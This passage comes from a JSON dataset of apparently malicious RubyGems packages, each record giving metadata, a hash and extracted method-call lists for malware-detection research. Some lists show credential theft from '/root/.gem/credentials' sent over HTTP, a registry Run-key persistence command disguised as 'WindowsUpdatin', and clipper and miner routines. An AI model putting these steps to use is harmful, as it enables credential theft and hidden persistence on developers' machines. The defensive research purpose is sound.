'RbConfig::CONFIG.[]', 'os.match', 'Windows.clipper', 'link', 'os.match', 'Linux.gems_cred', 'Open3.capture2', 'output.include?', 'Linux.miner', 'link', 'link', 'Base64.encode(e).to_s', 'Base64.encode', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'FileUtils.rm_rf', 'FileUtils.mkdir_p', 'self.get_plugin_status.==', 'self.get_plugin_status', 'puts', 'URI.parse', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'http.request(request).body', 'http.request', 'JSON.parse(response).[]', 'JSON.parse', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'self.fresh', 'File.dirname', 'FileUtils.mv', 'crons_dir.each', 'crons_dir', 'File.open', 'dir.+', 'f.<<', 'Base64.decode64', 'f.close', 'URI.parse', 'url.to_s', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'http.verify_mode=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'http.request', 'link', 'Base64.encode64(e).to_s', 'Base64.encode64', 'File.file?', 'Base64.encode64(File.read(\"/root/.gem/credentials\")).gsub', 'Base64.encode64', 'File.read', 'link', 'gem_conent.to_s', 'puts', 'Linux.download_plugin', 'require_relative', 'Linux.gems_cred', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'FileUtils.rm_rf', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'File.dirname', 'FileUtils.mkdir_p', 'ENV.[](\"USERPROFILE\").to_s.+', 'ENV.[](\"USERPROFILE\").to_s', 'ENV.[]', 'FileUtils.cp', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \" + ENV.[](\"USERPROFILE\").+', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \".+', 'ENV.[]', 'system', 'FileUtils.cp', 'File.dirname', 'Open3.capture2', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.directory?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'FileUtils.rm_rf', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'File.dirname', 'FileUtils.mkdir_p', 'ENV.[](\"USERPROFILE\").to_s.+', 'ENV.[](\"USERPROFILE\").to_s', 'ENV.[]', 'FileUtils.cp', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \" + ENV.[](\"USERPROFILE\").+', '\"reg add HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run /f /v WindowsUpdatin /t REG_SZ /d \".+', 'ENV.[]', 'system', 'FileUtils.cp', 'File.dirname', 'Open3.capture2', 'require', 'require', 'require', 'require', 'Capistrano::Logger.add_color_matcher', 'Capistrano::Logger.add_color_matcher', 'Capistrano::Logger.add_color_matcher', 'Capistrano::Logger.add_color_matcher', 'Capistrano::Logger.add_color_matcher', 'Capistrano::Logger.add_color_matcher', 'Capistrano::Logger.add_color_matcher', 'options.class.==', 'options.class', 'options.each', 'Capistrano::Logger.add_color_matcher', 'Capistrano::Logger.add_color_matcher', 'alias_method', '@@color_matchers.sort_by', 'i.[](:prio).-@', 'i.[]', '@@sorted_color_matchers.each', 'filter.[](:level).==', 'filter.[]', 'filter.[](:level).nil?', 'filter.[]', 'message.=~', 'filter.[]', 'line_prefix.=~', 'filter.[]', 'filter.[]', 'filter.[]', 'filter.[](:prepend).nil?', 'filter.[]', 'filter.[](:prepend).+', 'filter.[]', 'filter.[]', 'Time.now.strftime(\"%T\") + \" \".+', 'Time.now.strftime(\"%T\").+', 'Time.now.strftime', 'Time.now', 'color.!=', 'CAP_COLORS.[]', 'CAP_ATTRIBUTES.[]', 'line_prefix.nil?', 'colorize', 'line_prefix.to_s', 'org_log', 'colorize', '@@color_matchers.push', '\"\\\\e[#{attribute}#{color}m\" + message.strip.+', '\"\\\\e[#{attribute}#{color}m\".+', 'message.strip']",
            "n_tokens": 1866,
            "embedding": "[ 0.00185898 -0.03258197 -0.00608968 ... -0.00139849 -0.01929452\n  0.00911751]",
            "cluster": "0",
            "id": 704,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/capistrano-colors/0.5.5/capistrano-colors-0.5.5.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/capistrano-colors/0.5.5/capistrano-colors-0.5.5_extracted",
            "name": "capistrano-colors",
            "version": "0.5.5",
            "published_at": "2019-08-01T00:18:39.596Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "capistrano",
            "SHA-256": "47886c1c18206d4622de81d0f348bdcc1ec6a4879f1fec9fcd88f4917cc6f873"
        },
        {
            "name_version": "acception_subscriber-1.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acception_subscriber/1.1.0/acception_subscriber-1.1.0_extracted/acception_subscriber-1.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'Time.now.year', 'Time.now', 'Configuration.new', 'block_given?', 'configuration', 'attr_accessor', 'require', 'require', 'require', 'require', 'attr_reader', 'Trollop.options', 'version', 'banner', 'SUB_COMMANDS.map { |sub_cmd,|\\n  \"    #{sub_cmd}\"\\n}.join', 'SUB_COMMANDS.map', 'stop_on', 'ARGV.shift', 'cmd', 'Trollop.options', 'opt', 'opt', 'opt', 'opt', 'opt', 'opt', 'Trollop.options', 'opt', 'opt', 'opt', 'opt', 'opt', 'opt', 'Trollop.options', 'opt', 'Trollop.options', 'opt', 'Trollop.die', 'cmd.inspect', 'cmd', 'cmd.==', 'cmd', 'options.[]', 'options', 'options.[]', 'options', 'Trollop.die', 'options.[]', 'options', 'Trollop.die', 'options.[]', 'options', 'Trollop.die', '[\"restart\", \"status\", \"stop\"].include?', 'cmd', 'options.[]', 'options', 'Trollop.die', 'send', 'cmd', 'protected', 'options.[]', 'options', 'start_interactive', 'start_daemon', 'Acception::Subscriber::Server.new', 'options.merge', 'options', 'server.start', 'Acception::Subscriber::ServerDaemon.new', 'options', 'server.start', 'Acception::Subscriber::ServerDaemon.new', 'options', 'server.stop', 'stop', 'start_daemon', 'Acception::Subscriber::ServerDaemon.new(options).status', 'Acception::Subscriber::ServerDaemon.new', 'options', 'require', 'attr_accessor', 'attributes', 'Oj.load', 'File.read', 'Acception::Subscriber.configuration=', 'Configuration.new', 'attributes.each', 'attributes', 'options.[]', 'Acception::Subscriber.configuration.send', 'Acception::Subscriber.configuration', 'options.[]', '[\"debug\", \"error\", \"fatal\", \"info\", \"warn\"].each', 'define_method', 'messages.each', 'Acception::Subscriber.logger.send', 'Acception::Subscriber.logger', 'require', 'require', 'include', 'include', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'metadata.[]', 'debug', 'ANSI.cyan {\\n  \"HEADERS\"\\n}.+', 'ANSI.cyan', 'debug', 'ANSI.yellow {\\n  \"PAYLOAD\"\\n}.+', 'ANSI.yellow', 'resolve_type', 'handle_error', 'handle_license_violation', 'channel.acknowledge', 'delivery_info.delivery_tag', 'debug', 'ANSI.red {\\n  \"ERROR\"\\n}.+', 'ANSI.red', 'e.message', 'debug', 'ANSI.red {\\n  \"ERROR\"\\n}.+', 'ANSI.red', 'e.backtrace', 'channel.nack', 'delivery_info.delivery_tag', 'protected', 'headers.[]', 'Acception::Client::OpenMessages::Create.new', 'headers.[]', 'headers.[]', 'headers.[]', 'exception.[]', 'headers.[]', 'headers.[]', 'headers.[]', 'exception.[]', 'exception.[]', 'acception.call', 'Acception::Client::OpenMessages::Create.new', 'headers.[]', 'headers.[]', 'headers.[]', 'headers.[]', 'headers.[]', 'headers.[]', 'headers.[]', 'headers.[]', 'acception.call', 'payload.==', 'payload.==', 'Acception::Subscriber.configuration', 'require', 'require', 'include', 'include', 'attr_reader', 'configure_server', 'log_startup', 'run', 'trap', 'finalize', 'exit', 'sleep', 'protected', 'info', 'message_consumer.cancel', 'message_consumer', 'mq.close', 'mq', 'Bunny.new(host_uri).tap', 'Bunny.new', 'host_uri', 'bunny.start', 'mq.create_channel', 'mq', 'channel.queue', 'channel', 'config.queue', 'config', 'MessageHandler.pool', 'options.[]', 'options', 'options.[](:threads).==', 'options.[]', 'options', 'Celluloid::Actor.[]=', 'MessageHandler.new', 'queue.subscribe', 'queue', 'debug', 'ANSI.magenta', 'options.[](:threads).>', 'options.[]', 'options', 'pool.async.call', 'pool.async', 'pool', 'channel', 'message_handler.call', 'message_handler', 'channel', 'Celluloid::Actor.[]', 'config.host_uri', 'config', 'Acception::Subscriber.configuration', 'load_configuration', 'configure_acception', 'initialize_loggers', 'File.exists?', 'options.[]', 'options', 'options.[]=', 'options', 'Configuration.from_file', 'options.[]', 'options', 'Acception::Client.configure', 'c.authentication_token=', 'config.acception_auth_token', 'config', 'c.base_url=', 'config.acception_url', 'config', 'c.logger=', 'Acception::Subscriber.logger', 'c.open_timeout_in_seconds=', 'c.read_timeout_in_seconds=', 'require', 'require', 'require', 'attr_reader', 'options.[]', 'options.[]', 'get_pid', 'options.[]', 'process_exists?', 'abort', 'fork', 'fork', 'exit', 'Process.setsid', 'fork', 'exit', 'store_pid', 'Process.pid', 'File.umask', 'redirect_output!', 'run', 'Process.waitpid', 'Server.new(options).start', 'Server.new', 'options', 'kill_process', 'FileUtils.rm', 'pid_path', 'process_exists?', 'out.<<', 'pid', 'out.<<', '$stdout.puts', 'protected', 'File.open', 'pid_path', 'f.puts', '$stderr.puts', 'pid_path', 'e.class', 'e.message', 'exit!', 'File.exists?', 'pid_path', 'File.open', 'f.readline.to_s.gsub', 'f.readline.to_s', 'f.readline', 'pid.to_i', 'File.unlink', 'pid_path', '$stderr.puts', 'pid_path', 'e.class', 'e.message', 'exit', 'process_exists?', 'abort', '$stdout.write', 'pid', 'Process.kill', 'pid', 'process_exists?', 'iteration_num.<', 'sleep', '$stdout.write', 'process_exists?', '$stderr.puts', 'pid', '$stdout.puts', 'pid', '$stderr.puts', 'pid', 'pid', 'Process.kill', 'pid', '$stderr.puts', 'pid', 'options.[]', 'options', 'FileUtils.mkdir_p', 'File.dirname', 'FileUtils.touch', 'File.chmod', '$stdout.reopen', '$stderr.reopen', '$stdout.sync=', '$stdin.reopen', '$stdout.reopen', '$stderr.reopen', 'options.[]', 'options', 'options.[]', 'options', 'require', 'protected', 'Acception::Subscriber.logger=', 'Yell.new', 'l.level=', 'log_level', 'l.adapter', 'l.adapter', 'start_banner(options).each', 'start_banner', 'options', 'Acception::Subscriber.logger.info', 'Acception::Subscriber.logger', '[\"\", \"***\", \"* #{APP_NAME} started\", \"*\", \"* #{VERSION_COPYRIGHT}\", \"*\", \"* Configuration:\", (if options.[](:config_loaded)\\n  \"*   file: #{options.[](:config)}\"\\nelse\\n  nil\\nend), Acception::Subscriber::Configuration.attributes.map { |a,|\\n  \"*   #{a}: #{config_value(a)}\"\\n}, \"*\", \"***\"].flatten.reject', '[\"\", \"***\", \"* #{APP_NAME} started\", \"*\", \"* #{VERSION_COPYRIGHT}\", \"*\", \"* Configuration:\", (if options.[](:config_loaded)\\n  \"*   file: #{options.[](:config)}\"\\nelse\\n  nil\\nend), Acception::Subscriber::Configuration.attributes.map { |a,|\\n  \"*   #{a}: #{config_value(a)}\"\\n}, \"*\", \"***\"].flatten', 'options.[]', 'options.[]', 'Acception::Subscriber::Configuration.attributes.map', 'Acception::Subscriber::Configuration.attributes', 'config_value', 'options.fetch(:log_level, :info).to_sym', 'options.fetch', 'options', 'Acception::Subscriber.configuration.send', 'Acception::Subscriber.configuration', 'value.is_a?', 'redacted_hash', 'hash.keys.collect(&:to_s).grep(/#{redacted_keys}/i).each', 'hash.keys.collect(&:to_s).grep', 'hash.keys.collect', 'hash.keys', 'redacted_keys', 'hash.[]', 'redacted_hash.[]=', 'value.nil?', 'hash.merge', '[\"password\"].join']",
            "n_tokens": 1969,
            "embedding": "[ 0.00369548 -0.00977589 -0.0040544  ...  0.00538382 -0.02712691\n  0.00155257]",
            "cluster": "0",
            "id": 665,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acception_subscriber/1.1.0/acception_subscriber-1.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acception_subscriber/1.1.0/acception_subscriber-1.1.0_extracted",
            "name": "acception_subscriber",
            "version": "1.1.0",
            "published_at": "2020-02-15T22:11:28.189Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, acception-client, bunny, celluloid, multi_json, oj, trollop, yell",
            "SHA-256": "29193f7dc4444022d2ab4ac07b29f53555086c4476fc37383f4482de240dde04"
        },
        {
            "name_version": "action-pubsub-0.2.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/action-pubsub/0.2.1/action-pubsub-0.2.1_extracted/action-pubsub-0.2.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'extend', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', '::ActionPubsub::Config.new', 'block.call', 'config', '::ActionPubsub::Channels.new', 'channels.key?', 'channels', 'configure', 'config.disabled=', 'subscriptions.all.map', 'subscriptions.all', 'subscriptions', '_subscription.<<', '::Concurrent::Agent.new', '::ActionPubsub::Exchanges.new', 'path_string.split', 'segs.pop', 'segs.pop', 'segs.join', 'path_string.split', 'segs.pop', 'segs.join', 'paths.map', '::ActionPubsub.channels.[]', '::ActionPubsub.channels', 'SecureRandom.uuid', '::ActionPubsub.subscriptions.[]', '::ActionPubsub.subscriptions', '::Concurrent::Actor::Utils::AdHoc.spawn', 'target_channel.<<', 'lambda', 'block.call', 'routing_key.split(\".\").join', 'routing_key.split', 'self.[](path).<<', 'self.[]', 'exchanges.[](routing_key).keys.each', 'exchanges.[](routing_key).keys', 'exchanges.[]', 'exchanges', 'exchanges.[](routing_key).[](queue_name).<<', 'exchanges.[](routing_key).[]', 'exchanges.[]', 'exchanges', 'serialize_event', '::ActionPubsub::Subscriptions.new', '::ActionPubsub::Actors::SilentDeadLetterHandler.spawn', 'subscriptions.key?', 'subscriptions', 'attr_accessor', 'alias_method', 'delegate', 'delegate', 'delegate', 'delegate', 'extend', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'extend', 'autoload', 'autoload', 'autoload', 'autoload', 'extend', 'included', 'after_commit', '[exchange_prefix, \"changed\"].join', 'exchange_prefix', '::ActionPubsub.register_exchange', '[self.class.exchange_prefix, \"changed\"].join', 'self.class.exchange_prefix', 'self.class', '::ActionPubsub::Event.new', '::ActiveRecord::Base.connection_pool.with_connection', '::ActiveRecord::Base.connection_pool', '::ActionPubsub.publish_event', 'extend', 'included', 'after_commit', '[exchange_prefix, \"created\"].join', 'exchange_prefix', '::ActionPubsub.register_exchange', '[self.class.exchange_prefix, \"created\"].join', 'self.class.exchange_prefix', 'self.class', '::ActionPubsub::Event.new', '::ActiveRecord::Base.connection_pool.with_connection', '::ActiveRecord::Base.connection_pool', '::ActionPubsub.publish_event', 'extend', 'included', 'after_commit', '[exchange_prefix, \"destroyed\"].join', 'exchange_prefix', '::ActionPubsub.register_exchange', '[self.class.exchange_prefix, \"destroyed\"].join', 'self.class.exchange_prefix', 'self.class', '::ActionPubsub::Event.new', '::ActiveRecord::Base.connection_pool.with_connection', '::ActiveRecord::Base.connection_pool', '::ActionPubsub.publish_event', 'extend', 'included', 'after_commit', '[exchange_prefix, \"updated\"].join', 'exchange_prefix', '::ActionPubsub.register_exchange', '[self.class.exchange_prefix, \"updated\"].join', 'self.class.exchange_prefix', 'self.class', '::ActionPubsub::Event.new', '::ActiveRecord::Base.connection_pool.with_connection', '::ActiveRecord::Base.connection_pool', '::ActionPubsub.publish_event', 'extend', 'included', 'attr_accessor', '{}.with_indifferent_access', 'attribute_names.extract_options!', 'attribute_names.each', '@_on_change_watches.[]=', '@_on_change_watches.[](attribute).merge!', '@_on_change_watches.[]', 'on', 'record.previous_changes.each_pair', 'record.previous_changes', 'self.class.react_to_changed?', 'self.class', 'self.instance_exec', 'self.class.watched_attributes.[](k).[]', 'self.class.watched_attributes.[]', 'self.class.watched_attributes', 'self.class', 'watching_attribute?', 'watched_attributes.[](attribute_name).key?', 'watched_attributes.[]', 'watched_attributes', 'old_value.==', 'watched_attributes.[](attribute_name).[]', 'watched_attributes.[]', 'watched_attributes', 'watched_attributes.[](attribute_name).key?', 'watched_attributes.[]', 'watched_attributes', 'new_value.==', 'watched_attributes.[](attribute_name).[]', 'watched_attributes.[]', 'watched_attributes', 'watched_attributes.[](attribute_name).key?', 'watched_attributes.[]', 'watched_attributes', 'watched_attributes.[](attribute_name).[](:if).call', 'watched_attributes.[](attribute_name).[]', 'watched_attributes.[]', 'watched_attributes', 'watched_attributes.[](attribute_name).key?', 'watched_attributes.[]', 'watched_attributes', 'watched_attributes.[](attribute_name).[](:unless).call(resource).!', 'watched_attributes.[](attribute_name).[](:unless).call', 'watched_attributes.[](attribute_name).[]', 'watched_attributes.[]', 'watched_attributes', 'watched_attributes.key?', 'watched_attributes', 'self.instance_variable_get', 'extend', 'included', 'ancestors.include?', 'ancestors', 'include', 'class_attribute', 'attr_accessor', 'self.as_json', 'previous_changes', 'hash.merge!', 'previous_changes', 'hash.symbolize_keys!', 'private', 'self.exchange_prefix=', 'actions.each', 'ancestors.include?', 'ancestors', 'PUBLISHABLE_EVENTS.[]', 'include', 'PUBLISHABLE_EVENTS.[]', 'class_attribute', 'self.concurrency=', 'attr_accessor', 'subklass.subscription=', 'subklass.const_set', '::Class.new', 'subklass.subscription.subscriber=', 'subklass.subscription', 'subklass.reactions=', 'subklass.observed_exchanges=', '::Set.new', 'subklass.event_triggered_count=', '::Concurrent::AtomicFixnum.new', 'subklass.event_failed_count=', '::Concurrent::AtomicFixnum.new', 'subklass.event_processed_count=', '::Concurrent::AtomicFixnum.new', 'reactions.[]=', 'reactions', '{}.tap', 'hash.[]=', 'hash.[]=', 'options.extract!', 'register_reaction_to_event', 'self.event_failed_count.increment', 'self.event_failed_count', 'self.event_processed_count.increment', 'self.event_processed_count', 'self.event_triggered_count.increment', 'self.event_triggered_count', 'exchanges.each', 'self.observed_exchanges.<<', 'self.observed_exchanges', 'reaction.[](:block).blank?', 'reaction.[]', 'reaction.[](:conditions).blank?', 'reaction.[]', 'reaction.[](:conditions).key?', 'reaction.[]', 'reaction.[](:conditions).[](:unless).call(record).!', 'reaction.[](:conditions).[](:unless).call', 'reaction.[](:conditions).[]', 'reaction.[]', 'reaction.[](:conditions).key?', 'reaction.[]', 'reaction.[](:conditions).[](:if).call', 'reaction.[](:conditions).[]', 'reaction.[]', 'observed_exchanges.each', 'observed_exchanges', '[exchange_prefix, event_name].join', 'name.underscore', 'name', '[target_exchange, subscriber_key].join', '::ActionPubsub.register_queue', 'self.concurrency.times', 'self.concurrency', '::ActionPubsub.subscriptions.[]', '::ActionPubsub.subscriptions', 'self.subscription.spawn', 'self.subscription', 'self.subscription.bind_subscription', 'self.subscription', 'class_attribute', '::ActionPubsub.exchanges.[](target_exchange).[](subscriber_key).<<', '::ActionPubsub.exchanges.[](target_exchange).[]', '::ActionPubsub.exchanges.[]', '::ActionPubsub.exchanges', 'lambda', '::ActiveRecord::Base.connection_pool.with_connection', '::ActiveRecord::Base.connection_pool', '::ActionPubsub.deserialize_event', 'self.class.subscriber.reactions.[]', 'self.class.subscriber.reactions', 'self.class.subscriber', 'self.class', 'message.[]', 'message.[]', 'self.class.subscriber.react?', 'self.class.subscriber', 'self.class', 'message.[]', 'self.class.subscriber.increment_event_triggered_count!', 'self.class.subscriber', 'self.class', 'self.class.subscriber.new', 'self.class.subscriber', 'self.class', 'subscriber_instance.instance_exec', 'reaction.[]', 'self.class.bind_subscription', 'self.class', 'message.is_a?', 'self.class.bind_subscription', 'self.class', '::ActionPubsub.deserialize_event', '::ActionPubsub::Errors::SubscriptionReactionErrorMessage.new', '::ActionPubsub.config._on_error_block', '::ActionPubsub.config', '::ActionPubsub.config._on_error_block.call', '::ActionPubsub.config._on_error_block', '::ActionPubsub.config', 'extend', 'lambda', '::ActiveRecord::Base.connection_pool.with_connection', '::ActiveRecord::Base.connection_pool', 'block.call', '::ActionPubsub.on', '_as', '_subscriptions.each', 'subscriptions.<<', 'subscriptions', 'subscriptions', 'extend', 'autoload', 'autoload', 'puts', 'puts', 'dead_letter.inspect', '@receivers.<<', 'envelope.sender', 'envelope', 'distribute', '@receivers.delete', 'envelope.sender', 'envelope', '@receivers.include?', 'envelope.sender', 'envelope', '@buffer.<<', 'envelope', 'distribute', '@receivers.empty?.!', '@receivers.empty?', '@buffer.empty?.!', '@buffer.empty?', 'redirect', '@receivers.shift', '@buffer.shift', '::ActionPubsub.silent_dead_letter_handler', 'key?', 'add', '::ActionPubsub::Channel.spawn', 'require', 'self.[]=', 'self.[]=', 'self.[]=', 'self.[]=', '::Concurrent.use_stdlib_logger', 'self.[]', 'val.ancestors.include?', 'val.ancestors', '::ActionPubsub.include', 'self.[]=', 'require', 'attr_accessor', 'require', 'include', 'include', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'self.[]=', 'self.[]=', 'topic.split(\"/\").pop.to_sym', 'topic.split(\"/\").pop', 'topic.split', 'self.[]=', 'options.[]', 'self.[]=', 'self.[]=', 'self.[]=', '::SecureRandom.hex', 'self.[]=', 'options.[]', 'record.try(:class).try', 'record.try', 'self.[]=', 'self.[]', '::Time.now.to_i', '::Time.now', '[exchange_name, subscriber_name].join', 'self.[](exchange_name).all.any?', 'self.[](exchange_name).all', 'self.[]', 'queue.name.==', 'queue.name', 'self.[](exchange_name).add', 'self.[]', '::ActionPubsub::Queue.spawn', 'add', '::ActionPubsub::Exchanges.new', 'self.[]', 'key?', 'add', '::ActionPubsub::Exchanges.new', 'extend', 'included', 'class_attribute', 'class_attribute', 'self.subscriptions=', 'self._as=', '::ActionPubsub.on', '_as', '_subscriptions.each', 'subscriptions.<<', 'subscriptions', 'subscriptions', 'keys.map', 'keys', 'self.[]', 'register', '@data.value.keys', '@data.value', 'extend', 'autoload', 'extend', '::Marshal.dump', '::Marshal.load', 'include']",
            "n_tokens": 2549,
            "embedding": "[ 0.00225915 -0.01279212 -0.01116861 ...  0.00167949 -0.01721478\n  0.00829482]",
            "cluster": "0",
            "id": 385,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/action-pubsub/0.2.1/action-pubsub-0.2.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/action-pubsub/0.2.1/action-pubsub-0.2.1_extracted",
            "name": "action-pubsub",
            "version": "0.2.1",
            "published_at": "2020-02-15T22:12:14.929Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, guard, guard-rspec, guard-bundler, rake, rspec, rspec-pride, rspec-its, rspec-collection_matchers, rb-fsevent, simplecov, terminal-notifier-guard, pry, pry-nav, active_attr, activesupport, concurrent-ruby",
            "SHA-256": "b059917026e248372b5d2acec3225333c8024a8ca19b155d5726b6305e8268b2"
        },
        {
            "name_version": "banner-jobsub-0.1.2",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/banner-jobsub/0.1.2/banner-jobsub-0.1.2_extracted/banner-jobsub-0.1.2_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'attr_reader', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'configure_from_files', 'configure_from_hash', '@config.each', 'v.nil?', 'fail', '@config.[](:banjsproxy).downcase.==', '@config.[](:banjsproxy).downcase', '@config.[]', '@config.[]=', '@config.[]=', 'ENV.[]', 'set_db_connection', 'set_role_security', '@conn.select_one(\"SELECT GJBJOBS_TITLE FROM GJBJOBS WHERE GJBJOBS_NAME = :1\", @name).[]', '@conn.select_one', 'get_parameters', '@page_length.nil?', '@config.[](:page_length).to_i', '@config.[]', 'set_header', 'set_footer', 'ARGV.[]', 'File.new', 'ARGV.[]', 'FormatR::Format.new', 'temp_fmt.printFormatWithHash', 'FormatR::Format.new', '@header.+', '@params.each', 'temp_fmt.printFormatWithHash', 'private', '@conn.exec', 'cur.fetch_hash', 'r.each_with_object', 'm.[]=', 'k.downcase.to_sym', 'k.downcase', 'params.[]', 'p_def.[](:gjbpdef_number).to_i.-', 'p_def.[](:gjbpdef_number).to_i', 'p_def.[]', '@params.[]=', 'p_def.[](:gjbpdef_single_ind).==', 'p_def.[]', 'params_def.<<', 'cur.close', 'ENV.[]', 'get_parameter_values_from_db', 'File.exist?', '@name.downcase', 'get_parameter_values_from_file', 'get_parameter_values_from_prompt', 'private', 'YAML.load(IO.read(\"#{@name.downcase}.yaml\")).each', 'YAML.load', 'IO.read', '@name.downcase', '@params.[]=', 'k.to_sym', 'private', '@conn.exec', 'ENV.[]', 'cur.fetch_hash', 'r.[](\"GJBPRUN_NUMBER\").to_i', 'r.[]', 'p_num.==', 'r.[](\"GJBPRUN_VALUE\").nil?', 'r.[]', 'r.[](\"GJBPRUN_VALUE\").to_i', 'r.[]', 'p_num.>', 'params.count', 'fail', 'params.[]', 'p_num.-', 'params_def.[](p_num - 1).[](:gjbpdef_single_ind).==', 'params_def.[](p_num - 1).[]', 'params_def.[]', 'p_num.-', '@params.[]=', 'r.[]', '@params.[](p).<<', '@params.[]', 'r.[]', 'cur.row_count.==', 'cur.row_count', 'fail', 'ENV.[]', 'cur.close', '@conn.exec', 'ENV.[]', 'private', 'params.each_index', 'params.[]', '@params.[]=', 'print', 'gets.chomp', 'gets', 'params_def.[](i).[](:gjbpdef_single_ind).==', 'params_def.[](i).[]', 'params_def.[]', '@params.[]=', '@params.[](p).split', '@params.[]', 'private', 'opts.each', '@config.keys.include?', '@config.keys', 'k.to_sym', '@config.[]=', 'k.to_sym', 'private', 'ENV.[]', 'Dir.home', 'files.each', 'YAML.load', 'IO.read', 'config.each', '@config.keys.include?', '@config.keys', 'k.to_sym', '@config.[]=', 'k.to_sym', 'raise', 'private', 'OCI8.new', '@config.[]', '@config.[]', '@config.[]', 'private', '@conn.parse', 'cursor.exec', 'cursor.[](3).==', 'cursor.[]', '@conn.exec', 'cursor.[]', '@config.[]', 'outvars.[]', '@conn.parse', 'cursor.exec', '@conn.exec', 'cursor.[]', '@config.[]', 'outvars.[]', '@conn.exec', 'cursor.[]', 'private', '@config.[]', 'private', '@config.[](:header).empty?.!', '@config.[](:header).empty?', '@config.[]', '@config.[]', 'get_institution_name', 'Time.now.strftime(\"%d-%b-%Y %I:%M %p\").upcase', 'Time.now.strftime', 'Time.now', 'inst.center', '@title.center', 'private', '@conn.select_one(\"SELECT GUBINST_NAME FROM GUBINST WHERE GUBINST_KEY = \\'INST\\'\").[]', '@conn.select_one']",
            "n_tokens": 1049,
            "embedding": "[ 0.02019935 -0.01270288 -0.00141048 ... -0.00573489 -0.01807567\n  0.01485591]",
            "cluster": "0",
            "id": 420,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/banner-jobsub/0.1.2/banner-jobsub-0.1.2.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/banner-jobsub/0.1.2/banner-jobsub-0.1.2_extracted",
            "name": "banner-jobsub",
            "version": "0.1.2",
            "published_at": "2020-02-15T22:17:59.869Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, ruby-oci8, formatr",
            "SHA-256": "86a9f38bfd5018519d11dfd8dd244d15df258c5d7e402eb20826a0233fa991c8"
        },
        {
            "name_version": "capistrano_copy-subdir-0.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/capistrano_copy-subdir/0.1.0/capistrano_copy-subdir-0.1.0_extracted/capistrano_copy-subdir-0.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
